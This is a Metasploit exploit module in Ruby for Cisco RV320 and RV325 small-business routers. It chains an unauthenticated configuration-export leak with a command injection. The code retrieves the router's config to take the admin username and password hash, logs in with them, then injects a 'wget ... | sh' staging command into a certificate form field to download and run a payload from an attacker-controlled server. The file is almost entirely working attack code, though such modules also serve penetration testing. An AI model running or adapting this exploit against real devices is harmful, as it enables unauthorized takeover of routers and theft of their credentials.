##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking


  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Cisco RV320 and RV325 Unauthenticated Remote Code Execution",
      'Description'    => %q{
This exploit module combines an information disclosure (CVE-2019-1653) 
and a command injection vulnerability (CVE-2019-1652) together to gain
unauthenticated remote code execution on Cisco RV320 and RV325 small business
routers. Can be exploited via the WAN interface of the router. Either via HTTPS
on port 443 or HTTP on port 8007 on some older firmware versions. 
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'RedTeam Pentesting GmbH','Benjamin Grap' ],
      'References'     => [
          [ 'CVE','2019-1653' ], 
          [ 'CVE','2019-1652' ], 
          [ 'EDB','46243' ],
          [ 'BID','106728' ],
          [ 'BID','106732' ],
          [ 'URL', 'https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-002/-cisco-rv320-unauthenticated-configuration-export' ], 
          [ 'URL', 'https://www.redteam-pentesting.de/en/advisories/rt-sa-2018-004/-cisco-rv320-command-injection' ] 
      
      ],
      'Platform'       => 'linux',
      'Targets'        =>
        [
         [ 'LINUX MIPS64',
	   {
	    'Platform' => 'linux',
	    'Arch'     => ARCH_MIPS64
	   }
         ]
        ],
      'Payload'        =>
        {
          'BadChars' => ""
        },
      'CmdStagerFlavor' => [ 'bourne' ],
      'Privileged'     => false,
      'DisclosureDate' => "SEP 09 2018",
      'DefaultTarget'  => 0))

    register_options([
      Opt::RPORT(8007), # port of Cisco webinterface
      OptString.new('URIPATH', [true, 'The path for the stager. Keep set to default! (We are limited to 50 chars for the initial command.)', '/']),
      OptInt.new('HTTPDELAY', [true, 'Time that the HTTP Server will wait for the payload request', 15])
    ], self.class)
  end

  def execute_command(cmd, opts = {})
    # use generated payload, we don't have to do anything here
  end

  def autofilter
    true
  end

  def on_request_uri(cli, req)
    print_status("#{peer} - Payload request received: #{req.uri}")
    @cmdstager = generate_cmdstager().join(';')	
    send_response(cli, "#{@cmdstager}")
  end

  def primer
    payload_url = get_uri
    print_status("Downloading configuration from #{peer}")
    res = send_request_cgi({'uri'=>normalize_uri("cgi-bin","config.exp")})
    if res and res.code == 200
      print_status("Successfully downloaded config")
      username = res.body.match(/^USERNAME=([a-zA-Z]+)/)[1]
      pass = res.body.match(/^PASSWD=(\h+)/)[1]
      print_status("Got MD5-Hash: #{pass}")
      print_status("Loging in as user #{username} using password hash.")
      print_status("Using default auth_key 1964300002")
      res2 = send_request_cgi({
      	'uri' => normalize_uri("cgi-bin","userLogin.cgi"),
      	'method' => 'POST',
      	'data' => "login=true&portalname=CommonPortal&password_expired=0&auth_key=1964300002&auth_server_pw=Y2lzY28%3D&submitStatus=0&pdStrength=1&username=#{username}&password=#{pass}&LanguageList=Deutsch&current_password=&new_password=&re_new_password="
      })
      if res2 and res2.code == 200
        cookies = res2.get_cookies()
        print_status("Successfully logged in as user #{username}.")
        print_status("Got cookies: #{cookies}")
        print_status("Sending payload. Staging via #{payload_url}.")
        command_string = CGI::escape("'$(wget -q -O- #{payload_url}|sh)'")
        if(command_string.length <= 50)
            print_status("Staging command length looks good. Sending exploit!")
        else
            print_status("Warning: Staging command length probably too long. Trying anyway...")
        end
        res3 = send_request_cgi({
          'uri' => normalize_uri("certificate_handle2.htm"),
          'method' => 'POST',
          'cookie' => cookies,
              'vars_get' => {
                 'type' => '4',
              },
              'vars_post' => {
             'page' => 'self_generator.htm',
                 'totalRules' => '1',
                 'OpenVPNRules' => '30',
                 'submitStatus' => '1',
                 'log_ch' => '1',
                 'type' => '4',
                 'Counrty' => 'US',
                 'state' => 'CA',
                 'locality' => 'DC',
                 'organization' => 'cc',
                 'organization_unit' => 'A',
                 'email' => 'any@example.com',
                 'KeySize' => '512',
                 'KeyLength' => '1024',
                 'valid_days' => '30',
                 'SelectSubject_c' => '1',
                 'SelectSubject_s' => '1'
              },
              'data' => "common_name=#{command_string}"
              
        })
        if res3 and res3.code == 200
              print_status("Successfully sent payload but nothing happend!")
        else
              print_status("Sending payload timed out. Ok.")
        end
      else
        print_status("Could not login. Aborting.")
      end
    else
	print_status("Could not download config. Aborting.")
    end
  end

  def check
    #Check if device is vulnerable by downloading the config
    res = send_request_cgi({'uri'=>normalize_uri("cgi-bin","config.exp")})
    if res and res.code == 200 and res.body =~ /PASSWD/
      return Exploit::CheckCode::Vulnerable
    end 
    if res and res.code == 200
      return Exploit::CheckCode::Detected
    end
    return Exploit::CheckCode::Safe
  end

  def exploit
    # Main function.
    # Setting delay for the Stager.
    begin
      Timeout.timeout(datastore['HTTPDELAY']) {super}
    rescue Timeout::Error
      print_status("Waiting for stager connection timed out. Try increasing the delay.")
    end
  end
end
